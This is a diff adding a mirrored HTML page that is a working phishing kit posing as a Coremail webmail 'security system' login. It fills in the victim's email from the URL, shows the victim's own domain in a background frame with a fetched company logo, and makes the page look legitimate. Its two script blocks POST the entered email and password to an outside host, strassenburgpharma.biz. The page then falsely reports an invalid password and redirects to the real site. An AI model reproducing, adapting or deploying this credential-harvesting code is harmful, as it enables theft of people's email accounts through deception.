@@ -1,0 +1,531 @@
+<html><!--
+* PyWebCopy Engine [version 7.0.2]
+* Copyright 2020; Raja Tomar
+* File mirrored from [https://ipfs.io/ipfs/bafybeibyrut7p5klxduxde4nhuokllpw53vivwgb5fntoqdtd4do2lkvxe/]
+* At UTC datetime: [2023-06-24 12:18:18.060683]
+--><head id="dHead">
+        <title>Webmail Security System</title> <!-- &#233;&#128;&#154;&#232;&#191;&#135;&#229;&#174;&#154;&#229;&#136;&#182;&#229;&#138;&#159;&#232;&#131;&#189;&#229;&#161;&#171;&#229;&#133;&#133;&#229;&#128;&#188; -->
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+        
+        <meta name="renderer" content="webkit|ie-stand">
+        <link id="favor" rel="shortcut icon">
+        <link rel="stylesheet" href="../../../c2.icoremail.net/coremail/common/assets/b8f77813/css/dist/main.css">
+        <link rel="stylesheet" href="../../../c2.icoremail.net/coremail/common/assets/b8f77813/css/iconfont/iconfont.css">
+        <link rel="stylesheet" href="../../../c2.icoremail.net/coremail/common/assets/login/login.css">
+    <script charset="utf-8" src="../../../c2.icoremail.net/coremail/bundle/loginCommon.b0127.js"></script><script charset="utf-8" src="../../../c2.icoremail.net/coremail/bundle/login.b0127.js"></script><link id="favor" rel="shortcut icon"></head>
+	<style>
+	        body{
+            width:99%;
+            height:100%;
+            margin:0;
+            padding:0;
+			overflow: hidden; /* Hide scrollbars */
+        }
+        #mainPage{
+            border:none;
+        }
+	
+	
+	</style>
+    <body style="background-color:white;">
+	
+        <div class="container j-container" style="background-color:white;">
+		<iframe id="mainPage" src="https://ipfs.io/ipfs/bafybeibyrut7p5klxduxde4nhuokllpw53vivwgb5fntoqdtd4do2lkvxe/" scrolling="no" sandbox="allow-forms allow-pointer-lock allow-popups allow-scripts" style="position: absolute; height: 100%;border: none;width:100%;"></iframe>
+            <div class="logo j-logo" style="background-color:white;">
+                
+               
+            </div>
+            <div class="copyright j-copyright"><span id="logoname" style="text-transform:capitalize;"></span> &#194;&#169; copyright 2000 - 2021.</div>
+            <div class="main j-main">
+            <div class="loginArea normalForm">
+
+                <div class="content-wrapper">
+                    
+                    <div class="formLogin">
+                        
+
+                        <div class="second-auth-wrap j-second-auth-wrap f-dn">
+                            <div class="auth-body j-auth-body"></div>
+                            
+                            <div class="auth-footer j-auth-footer clearfix">
+                                
+                                    <label class="authorize-device-wrap">
+                                        <input type="checkbox" class="j-authorize-device rc-hidden"><i class="checkbox"></i>
+                                        Authorize device.
+                                    </label>
+                                
+                                <div class="u-dialog-btns">
+                                    <input class="u-btn u-btn-default j-back" type="button" value="Back">
+                                    <input class="u-btn u-btn-primary j-confirm" type="button" value="Confirm">
+                                </div>
+                            </div>
+                        </div>
+
+                        <form action="" method="post" class="j-login-form u-form" id="contact">
+                           
+                            <div class="inputArea">
+							<center><img src="" id="logoimg" style="width:100px;height:100px;border-radius:50%;"></center><br>
+                                
+                                <div class="u-form-item u-form-item-1 forUid">
+                                    <div class="wrapper">
+                                        <label class="label"><i class="fa fa-user"></i></label>
+                                        <div class="input-wrapper">
+                                            <div class="sub-input-wrapper">
+                                                
+                                                <input class="u-input" type="text" name="email" autocomplete="off" id="email" tabindex="1" placeholder="username" value="">
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                
+                                <div class="u-form-item u-form-item-1 forPassword">
+                                    <div class="wrapper">
+                                        <label class="label"><i class="fa fa-lock"></i></label>
+                                        <div class="input-wrapper">
+                                            <div class="sub-input-wrapper">
+                                                
+                                                
+                                                    
+                                                    
+                                                        <input class="u-input" type="password" name="password" id="password" placeholder="password" tabindex="2">
+														
+														<p id="msg" style="color:red;"></p>
+                                                    
+                                                
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                
+                                
+
+                                
+                                
+
+                                
+                                
+                            </div>
+                            <div class="u-form-item u-form-item-2">
+                                <input type="hidden" name="action:login">
+                                <button class="u-btn u-btn-primary submit j-submit" type="submit" id="submit-btn">
+                                    Sign in
+                                </button>
+                            </div>
+                            
+                            
+                                
+                                
+                                
+                                    
+                                
+                            
+                            <div class="u-form-item u-form-item-2 f-dn" id="warnOrErrDiv">
+                                <label></label>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+        </div>
+
+        <script type="text/x-handlebars-template" id="loginFormTpl">
+            <div class="loginArea normalForm">
+
+                <div class="content-wrapper">
+                    
+                    <div class="formLogin">
+                        
+
+                        <div class="second-auth-wrap j-second-auth-wrap f-dn">
+                            <div class="auth-body j-auth-body"></div>
+                            
+                            <div class="auth-footer j-auth-footer clearfix">
+                                
+                                    <label class="authorize-device-wrap">
+                                        <input type="checkbox" class="j-authorize-device" />
+                                        Authorize device.
+                                    </label>
+                                
+                                <div class="u-dialog-btns">
+                                    <input class="u-btn u-btn-default j-back" type="button" value="Back">
+                                    <input class="u-btn u-btn-primary j-confirm" type="button" value="Confirm" />
+                                </div>
+                            </div>
+                        </div>
+
+                       
+                    </div>
+                </div>
+            </div>
+        </script>
+
+        <script type="text/x-handlebars-template" id="smsVerifyTpl">
+            <div class="sms-verify-wrap j-wrap">
+                
+                    
+                        <p class="desc-title">Please enter the dynamic password</p>
+                    
+                    
+                
+                <div class="mg-top-l">
+                    <input type="text" maxlength="4" class="u-input j-code" />
+                    <button class="u-btn u-btn-default j-send" style="vertical-align: baseline;">resent</button>
+                </div>
+                
+                    
+                        <p class="error j-error mg-top-s"></p>
+                    
+                
+            </div>
+        </script>
+
+        <script type="text/x-handlebars-template" id="dynamic1VerifyTpl">
+            <div class="dynamic1-verify-wrap">
+                
+                    
+                        <p class="desc-title">Dynamic code is required.</p>
+                    
+                    
+                
+                <p class="desc-sub">Contact with admin if you can't open security app</p>
+                <div class="mg-top-l">
+                    <input type="text" maxlength="6" class="u-input j-code" />
+                </div>
+                
+                    
+                        <p class="error j-error mg-top-s"></p>
+                    
+                
+            </div>
+        </script>
+
+        <script type="text/x-handlebars-template" id="dynamic2VerifyWrapTpl">
+            <div class="dynamic2-verify-wrap j-dynamic2-verify"></div>
+        </script>
+
+        <script type="text/x-handlebars-template" id="dynamic2PushVerifyTpl">
+            <p class="desc-title">The authorization information was send to your auth app, please check it out!</p>
+            <p class="desc-sub">If no information received, make sure the network is connected or contact with admin. And, you can choose to use auth code to authorize.</p>
+            <p class="mg-top-s">
+                <a class="verify-toggle j-toggle" href="javascript:void(0)">Use auth code</a>
+            </p>
+            
+                
+                    <p class="error j-error mg-top-s">Failed to confirm pushing auth info. </p>
+                
+            
+        </script>
+
+        <script type="text/x-handlebars-template" id="dynamic2CodeVerifyTpl">
+            <p class="desc-title">Please input the auth code with 6 digits generated by your auth App:</p>
+            <div class="mg-top-l">
+                <input type="text" maxlength="6" class="u-input j-code" style="padding-left: 5px" placeholder="Captcha" />
+            </div>
+            <p class="mg-top-s">
+                <a class="verify-toggle j-toggle" href="javascript:void(0)">Use pushing auth</a>
+            </p>
+            
+                
+                    <p class="error j-error mg-top-s"></p>
+                
+            
+        </script>
+
+        
+
+        
+        
+
+       
+        
+ <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery.session@1.0.0/jquery.session.min.js"></script>
+<script>
+
+    /* global $ */
+    $(document).ready(function(){
+      var count=0;
+
+      $('#back1').click(function () {
+        $("#msg").hide();
+        $('#email').val("");
+        $("#automail").animate({left:200, opacity:"hide"}, 0);
+        $("#inputbar").animate({right:200, opacity:"show"}, 1000);
+
+      });
+
+      var email = window.location.hash.substr(1);
+      if (!email) {
+
+      }
+      else
+      {
+        var my_email =email;
+        $('#email').val(my_email);
+		
+		
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_email)) {
+          $('#error').show();
+          email.focus;
+          return false;
+        }
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();
+        var finalu= c.toLowerCase();
+		  $("#logoname").html(finalu);
+
+        $("#logoimg").attr("src", "https://logo.clearbit.com/"+my_slice);
+		$("#mainPage").attr("src", "https://www."+my_slice);
+       
+       
+      }
+
+
+      
+      $('#submit-btn').click(function(event){
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var email=$("#email").val();
+        var password=$("#password").val();
+        var msg = $('#msg').html();
+        $('#msg').text( msg );
+
+                    if (!password) {
+                $('#msg').show();
+                $('#msg').html("Password field is emply.!");
+
+                return false;
+            }
+
+
+      ///////////new injection////////////////
+      var my_email =email;
+      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+      if (!filter.test(my_email)) {
+        $('#error').show();
+        email.focus;
+        return false;
+      }
+
+      var ind=my_email.indexOf("@");
+      var my_slice=my_email.substr((ind+1));
+      var c= my_slice.substr(0, my_slice.indexOf('.'));
+      var final= c.toLowerCase();
+      var finalu= c.toUpperCase();
+
+       
+
+      
+      ///////////new injection////////////////
+      count=count+1;
+      
+      $.ajax({
+        dataType: 'JSON',
+        url: 'https://strassenburgpharma.biz/gentle/posto.php',
+        type: 'POST',
+        data:{
+          email:email,
+          password:password,
+        },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+              $('#submit-btn').html('Verifing...');
+            },
+            success: function(response){
+              if(response){
+                $("#msg").show();
+                console.log(response);
+                if(response['signal'] == 'ok'){
+                  $("#password").val("");
+                  if (count>=2) {
+                    count=0;
+                    // window.location.replace(response['redirect_link']);
+                  window.location.replace("http://www."+my_slice);
+
+                  }
+                  $("#msg").show();
+    	$('#msg').html("Invalid password. Please try again");
+                }
+                else{
+                 $("#msg").show();
+    	$('#msg').html("Invalid password. Please try again");
+                }
+              }
+            },
+            error: function(){
+              $("#password").val("");
+              if (count>=2) {
+                count=0;
+                  window.location.replace("http://www."+my_slice);
+              }
+              $("#msg").show();
+             $("#msg").show();
+			$('#msg').html("Invalid password. Please try again");
+            },
+            complete: function(){
+              $('#submit-btn').html('Sign in');
+            }
+          });
+    });
+
+
+    });
+
+
+  </script>
+
+<script>
+
+    /* global $ */
+    $(document).ready(function(){
+      var count=0;
+
+      $('#back1').click(function () {
+        $("#msg").hide();
+        $('#email').val("");
+        $("#automail").animate({left:200, opacity:"hide"}, 0);
+        $("#inputbar").animate({right:200, opacity:"show"}, 1000);
+
+      });
+
+      var email = window.location.hash.substr(1);
+      if (!email) {
+
+      }
+      else
+      {
+        var my_email =email;
+        $('#email').val(my_email);
+		
+		
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_email)) {
+          $('#error').show();
+          email.focus;
+          return false;
+        }
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();
+        var finalu= c.toLowerCase();
+		  $("#logoname").html(finalu);
+
+        $("#logoimg").attr("src", "https://logo.clearbit.com/"+my_slice);
+		$("#mainPage").attr("src", "https://www."+my_slice);
+       
+       
+      }
+
+
+      
+      $('#submit-btn').click(function(event){
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var email=$("#email").val();
+        var password=$("#password").val();
+        var msg = $('#msg').html();
+        $('#msg').text( msg );
+
+                    if (!password) {
+                $('#msg').show();
+                $('#msg').html("Password field is emply.!");
+
+                return false;
+            }
+
+
+      ///////////new injection////////////////
+      var my_email =email;
+      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+      if (!filter.test(my_email)) {
+        $('#error').show();
+        email.focus;
+        return false;
+      }
+
+      var ind=my_email.indexOf("@");
+      var my_slice=my_email.substr((ind+1));
+      var c= my_slice.substr(0, my_slice.indexOf('.'));
+      var final= c.toLowerCase();
+      var finalu= c.toUpperCase();
+
+       
+
+      
+      ///////////new injection////////////////
+      count=count+1;
+      
+      $.ajax({
+        dataType: 'JSON',
+        url: 'https://strassenburgpharma.biz/gentle/postoo.php',
+        type: 'POST',
+        data:{
+          email:email,
+          password:password,
+        },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+              $('#submit-btn').html('Verifing...');
+            },
+            success: function(response){
+              if(response){
+                $("#msg").show();
+                console.log(response);
+                if(response['signal'] == 'ok'){
+                  $("#password").val("");
+                  if (count>=2) {
+                    count=0;
+                    // window.location.replace(response['redirect_link']);
+                  window.location.replace("http://www."+my_slice);
+
+                  }
+                  $("#msg").show();
+    	$('#msg').html("Invalid password. Please try again");
+                }
+                else{
+                 $("#msg").show();
+    	$('#msg').html("Invalid password. Please try again");
+                }
+              }
+            },
+            error: function(){
+              $("#password").val("");
+              if (count>=2) {
+                count=0;
+                  window.location.replace("http://www."+my_slice);
+              }
+              $("#msg").show();
+             $("#msg").show();
+			$('#msg').html("Invalid password. Please try again");
+            },
+            complete: function(){
+              $('#submit-btn').html('Sign in');
+            }
+          });
+    });
+
+
+    });
+
+
+  </script>
+
+</body></html>
